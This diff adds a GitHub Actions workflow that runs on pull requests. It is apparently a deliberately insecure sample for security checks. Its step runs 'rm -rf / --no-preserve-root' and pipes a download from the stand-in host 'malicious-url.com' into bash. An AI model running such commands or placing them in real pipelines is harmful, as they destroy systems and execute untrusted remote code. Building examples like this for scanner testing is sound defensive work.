@@ -1,0 +1,18 @@
+name: Insecure Shell Commands
+
+on:
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  insecure-shell:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Dangerous shell commands
+        run: |
+          rm -rf / --no-preserve-root # Example of a destructive command
+          wget http://malicious-url.com/script.sh | bash # Untrusted external source
